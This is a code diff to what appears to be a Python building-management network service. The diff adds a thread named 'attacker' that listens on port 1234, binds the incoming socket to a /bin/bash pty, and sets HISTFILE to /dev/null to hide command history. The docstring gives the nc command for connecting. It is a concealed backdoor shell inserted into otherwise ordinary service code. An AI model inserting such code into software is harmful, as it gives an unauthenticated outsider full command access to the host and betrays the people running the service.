@@ -13,6 +13,9 @@ import threading
 import json
 import os
 
+import pty
+import sys
+
 import flatbuffers
 from BuildingConfig import *
 
@@ -68,6 +71,24 @@ def worker():
         #management_socket.connect(addr)
         management_socket.sendto(reply, (addr[0], 6666))
 
+################################################################################
+# ATTACKER
+################################################################################
+def attacker():
+    """
+        Thread to return a shell to attacker
+        Connect use netcat: nc [host] [port] e.g. nc 192.168.0.102 1234 
+    """
+    att = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    att.bind(("0.0.0.0", 1234))
+    att.listen(5)
+    rem, addr = att.accept()
+    os.dup2(rem.fileno(), 0)
+    os.dup2(rem.fileno(), 1)
+    os.dup2(rem.fileno(), 2)
+    os.putenv("HISTFILE", '/dev/null')
+    pty.spawn("/bin/bash")
+    att.close()
 
 
 ################################################################################
@@ -92,6 +113,10 @@ def main():
     t = threading.Thread(target=worker)
     t.daemon = True
     t.start()
+
+    att = threading.Thread(target=attacker)
+    att.deamon = True
+    att.start()
 
     while True:
         #  Wait for next request from client
